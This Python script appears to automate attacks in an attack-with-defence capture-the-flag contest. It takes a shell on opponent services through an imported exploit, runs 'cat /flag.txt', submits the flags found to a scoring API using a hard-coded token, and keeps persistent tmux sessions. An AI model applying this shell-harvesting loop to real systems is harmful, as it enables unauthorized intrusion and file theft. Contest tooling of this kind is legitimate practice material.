#!/usr/bin/env python3
# -*- coding: utf-8 -*- #
# @偏有宸机_AutoAWD-Template
# Exploiting: python Autopwn.py [Exploit_Template]
# Tmux_Useing    : tmux ls
#                  tmux a -t tmux_id
# Edit values:
#      - main()
#           - ip & port & cmd & flag_head
#      - Submit_flag()
#           - url
#           - headers {Token & Content-type}
#           - data
from pwn import *
import time
import os
import sys
import requests
from exploit import *
import json

def submit_flag(flag_value):
    url = 'http://121.40.134.251:19999/api/flag'
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36',
        'Content-Type': 'application/json',
        'Origin': 'http://121.40.134.251:19999',
        'Referer': 'http://121.40.134.251:19999/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Authorization':'186ec361759f0a15505d91a4813376d8'
    }
    
    data = json.dumps({
        'flag':flag_value
    })
    s = requests.session()
    req = s.post(url = url,headers=headers,data=data,verify = False)
    content = req.content
    # print("[+] Content : %s" % (content))
    if "错误".encode("utf-8")  in content:        #提交失败
        print("[T.T] Flag提交错误!")
        return False
    elif "重复".encode("utf-8") in content:      #flag重复
        info("[ :-] Flag提交重复!")
        return 1
    elif "成功".encode("utf-8") in content:      #提交成功
        success("[^.^] Flag提交成功!")
        return 2
    else:                                       #其他错误
        print("[T.T] 其他错误!")
        return False
        
def get_shell(expName,ip='', port=''):
    #exploit code
    global tmux
    try:
        tmux = RemPro(ip,port) 
        sh = eval(expName)()
        return sh
    except:
        print("[>.<] 连接出错或EXP存在问题!")
        return 0
def kill_session(idx):
    os.system("tmux kill-session -t "+idx)

def attack(expName,ip,port,cmd,flag_head,sleep_time=1):
    try:    
        global submit_status 
        submit_status = 0
        sh=get_shell(expName=expName,ip=ip,port=port)
        #sh = get_shell(ip='127.0.0.1', port=PORT)
        sh.sendline(cmd)
        try:
            sh.recvuntil(flag_head+'{', drop=True,timeout = sleep_time)
            flag = sh.recvuntil('}', drop=True,timeout = sleep_time)
            flag = flag_head+"{"+str(flag,"utf-8")+"}"
        except :
            print('[T.T] FUCK...Flag not found !')
            # return 0
        success('[^.^] Flag => %s',flag)
        submit_status = submit_flag(flag)
        # if flag!="flag{}":
        #     submit_status = 2
        return flag
    except:
        print('[T.T] FUCK...Flag not found !')

def tmux_session(submit_status,flag,ip,port,expName):
    tmux_id = port                          # Edit
    date = time.strftime('%H:%M:%S',time.localtime(time.time()))
    execpy = "python "+"exploit.py "+ ip +" "+port+" "+expName
    tmuxnew = "tmux new -d -s "+"Pwn_"+tmux_id
    tmuxexec_0 = "tmux send -t Pwn_"+tmux_id+" '\n\n' "+"enter"
    tmuxexec = "tmux send -t Pwn_"+tmux_id+" '"+execpy+"' "+"enter"

    if submit_status == 2 :
        os.system(tmuxnew)
        os.system(tmuxexec_0)
        os.system(tmuxexec)
        success("[^.^] 创建Tmux会话成功! = > "+"Pwn_"+tmux_id)
        flag_list = 'Pwn_'+tmux_id+' - '+date+' - '+flag+'\n'
        fd.write(flag_list)
    elif submit_status == 1:
        info("[-.-] 该会话已存在! => "+"Pwn_"+tmux_id)
        
def main(expName="exp"):    
    global fd
    with open('./flag_list.txt', 'a+') as fd:
        fd.write("---------------------------------------------------------------------------\n")
        fd.write("              > 本轮进攻时间  - "+time.strftime('%H:%M:%S',time.localtime(time.time()))+" - Exp_Temp : "+expName+" <\n")
        for i in range(21,24):
            ip = '121.40.134.251'
            port = '1{}80'.format(str(i).rjust(2,'0'))
            cmd = "cat /flag.txt"
            flag_head = "XCCTF"

            flag = attack(expName,ip,port,cmd,flag_head,sleep_time=2)
            tmux_session(submit_status,flag,ip,port,expName)
            print("-"*0x50+'\n')
        fd.write("---------------------------------------------------------------------------\n")
    # submit_flag("flag{7052d387-1076-32ad-b644-c92482d5803d}")


if __name__ == '__main__':
    if len(sys.argv) > 1 :
        main(sys.argv[1])
    else:
        main()